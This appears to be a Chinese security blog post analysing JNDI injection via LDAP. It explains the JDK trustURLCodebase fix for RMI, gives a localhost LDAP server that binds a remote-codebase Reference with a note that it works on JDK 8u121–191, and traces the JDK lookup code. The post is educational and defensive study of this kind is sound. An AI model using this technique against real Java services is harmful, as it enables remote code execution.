---
title: JNDI注入-ldap篇
url: https://mp.weixin.qq.com/s/jHLVsy2cxeoLV663DC8sCQ
source: Doonsec's feed
date: 2026-03-23
fetch_date: 2026-03-24T04:11:51.364608
---

# JNDI注入-ldap篇

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/W2zgF4oB0qAYecrz5jc9YOyGG7jzKqqcavQH1CTkAKBQDKqXialxwU3Z4vMpIH29HrtAVVXIgjHXpYqOnnd09y6Nf00JXKJzjhXvO9RsOzSU/0?wx_fmt=jpeg)

# JNDI注入-ldap篇

小猫咪
小猫咪

梦想变成大黑客的小猫咪

![]()

在小说阅读器中沉浸阅读

### rmi修复

RegistryContext中加入

![](https://mmbiz.qpic.cn/mmbiz_png/W2zgF4oB0qAlLN4D2WVagEFV55COVsZI18Au5YGIqk9dD04tDSp12ibiapvibRIUpRsKBYwocQwY2uTFic1n65N2hV7QRBjcN0iaG3lhBCBzl5BA/640?wx_fmt=png&from=appmsg)

```
static final boolean trustURLCodebase;
```

trustURLCodebase系统参数默认是false

![](https://mmbiz.qpic.cn/mmbiz_png/W2zgF4oB0qD3CBlbUEAQqPXujpBs9gpcoRnw6dCFbAYnrYfwTsjrnUfyribEPRDMFmslRYJS0KsR85LvjXNb3Avaoa2PDGFSsqQ1UAibQCnTw/640?wx_fmt=png&from=appmsg)

```
if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
    throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
}
```

这是整个方法中最关键的**防御逻辑**：

* • **条件 1**:`var8 != null`

+ • 确认提取到了`Reference`对象。

* • **条件 2**:`var8.getFactoryClassLocation() != null`

+ • 检查这个`Reference`是否指定了**工厂类的远程加载地址**（即`factoryLocation`，例如`http://...`）。
+ • 如果为`null`，说明工厂类在本地 classpath 中，相对安全。
+ • 如果不为`null`，说明需要通过网络下载类文件，**这是高危操作**。

* • **条件 3**:`!trustURLCodebase`

+ • 检查全局信任标志`trustURLCodebase`是否为`false`。
+ • 这个标志对应 JVM 启动参数：`Dcom.sun.jndi.rmi.object.trustURLCodebase=true`。
+ • **默认情况下（JDK 8u191+），这个值为false**。

* • **结果**：

+ • 如果同时满足以上三个条件（是 Reference + 有远程地址 + 未开启信任），直接抛出`ConfigurationException`异常，**阻断**后续的类加载过程。
+ • 这就是为什么在现代 JDK 上，默认的 JNDI RMI 注入 payload 会失效的原因。

### jndi-ldap

开启一个ldap服务

jndi-ldap server

```
package org.example;

import ...

public class JNDILDAPServer {
    public static void main(String[] args) throws Exception{
        Hashtable env = new Hashtable();
//      env.put(Context.INITIAL_CONTEXT_FACTORY,
//      "com.sun.jndi.ldap.LdapCtxFactory");
//      env.put(Context.PROVIDER_URL,
//      "ldap://localhost:10389");

        InitialContext initialContext = new InitialContext();
        Reference refObj = new Reference("TestRef", "TestRef", "http://localhost:7777/");
        initialContext.rebind("ldap://localhost:10389/cn=test,dc=example,dc=com", refObj);
    }
}
```

client端

```
package org.example.rmi;

import javax.naming.InitialContext;

public class JNDIRMIClient {
    public static void main( String[] args ) throws Exception
    {
        InitialContext initialContext = new InitialContext();
        RemoteObj remoteObj = (RemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}
```

可以打jdk8u  121-191

### 代码分析

LdapCtx类

```
protected Object c_lookup(Name name, Continuation cont)
            throws NamingException {
        cont.setError(this, name);
        Object obj = null;
        Attributes attrs;

        try {
            SearchControls cons = new SearchControls();
            cons.setSearchScope(SearchControls.OBJECT_SCOPE);
            cons.setReturningAttributes(null); // ask for all attributes
            cons.setReturningObjFlag(true); // need values to construct obj

            LdapResult answer = doSearchOnce(name, "(objectClass=*)", cons, true);
            respCtls = answer.resControls; // retrieve response controls

            // should get back 1 SearchResponse and 1 SearchResult

            if (answer.status != LdapClient.LDAP_SUCCESS) {
                processReturnCode(answer, name);
            }

            if (answer.entries == null || answer.entries.size() != 1) {
                // found it but got no attributes
                attrs = new BasicAttributes(LdapClient.caseIgnore);
            } else {
                LdapEntry entry = answer.entries.elementAt(0);
                attrs = entry.attributes;

                Vector<Control> entryCtls = entry.respCtls; // retrieve entry controls
                if (entryCtls != null) {
                    appendVector(respCtls, entryCtls); // concatenate controls
                }
            }

            if (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != null) {
                // serialized object or object reference
                obj = Obj.decodeObject(attrs);
            }
            if (obj == null) {
                obj = new LdapCtx(this, fullyQualifiedName(name));
            }
        } catch (LdapReferralException e) {
            if (handleReferrals == LdapClient.LDAP_REF_THROW)
                throw cont.fillInException(e);

            // process the referrals sequentially
            while (true) {

                LdapReferralContext refCtx =
                    (LdapReferralContext)e.getReferralContext(envprops, bindCtls);
                // repeat the original operation at the new context
                try {

                    return refCtx.lookup(name);

                } catch (LdapReferralException re) {
                    e = re;
                    continue;

                } finally {
                    // Make sure we close referral context
                    refCtx.close();
                }
            }

        } catch (NamingException e) {
            throw cont.fillInException(e);
        }

        try {
            return DirectoryManager.getObjectInstance(obj, name,
                this, envprops, attrs);

        } catch (NamingException e) {
            throw cont.fillInException(e);

        } catch (Exception e) {
            NamingException e2 = new NamingException(
                    "problem generating object using object factory");
            e2.setRootCause(e);
            throw cont.fillInException(e2);
        }
    }
```

```
 obj = Obj.decodeObject(attrs);
```

```
    static Object decodeObject(Attributes attrs)
        throws NamingException {

        Attribute attr;

        // Get codebase, which is used in all 3 cases.
        String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE]));
        try {
            if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) {
                ClassLoader cl = helper.getURLClassLoader(codebases);
                return deserializeObject((byte[])attr.get(), cl);
            } else if ((attr = attrs.get(JAVA_ATTRIBUTES[REMOTE_LOC])) != null) {
                // For backward compatibility only
                return decodeRmiObject(
                    (String)attrs.get(JAVA_ATTRIBUTES[CLASSNAME]).get(),
                    (String)attr.get(), codebases);
            }

            attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);
            if (attr != null &&
                (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) ||
                    attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) {
                return decodeReference(attrs, codebases);
            }
            return null;
        } catch (IOException e) {
            NamingException ne = new NamingException();
            ne.setRootCause(e);
            throw ne;
        }
    }
```

拿到String[] codebases = getCodebases(attrs.get(JAVA\_ATTRIBUTES[CODEBASE]));

| 类型 | 是否直接存储对象 | 是否涉及工厂/引用 | 安全风险 | 典型用途 |
| --- | --- | --- | --- | --- |
| Serializable Objects | ✅ 是 | ❌ 否 | 反序列化漏洞 | 配置、缓存 |
| Referenceable / Reference | ❌ 否（存 Reference） | ✅ 是 | JNDI 注入 RCE | 动态对象构建 |
| DirContext + Attributes | ✅ 是（+属性） | ❌ 否 | 较低 | LDAP 用户/资源管理 |
| RMI Objects | ❌ 否（存 stub/ref） | ✅ 可能 | RMI 注册表劫持 | 分布式服务调用 |
| CORBA Objects | ❌ 否 | ✅ 可能 | 较低（老旧） | 跨语言分布式系统 |

SERIALIZED\_DATA如果是序列化的 调用，ClassLoader cl = helper.getURLClassLoader(codebases);

因为是一个引用的

```
            attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);
            if (attr != null &&
                (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) ||
                    attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) {
                return decodeReference(attrs, codebases);
            }
```

```
decodeReference方法 ：解出引用
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/W2zgF4oB0qDXAkVev3BOf5LHRbzInQp4KoyAtDmnwo0Mx1tOnvBMu9NianJP99AVevgLvyWHjqtt...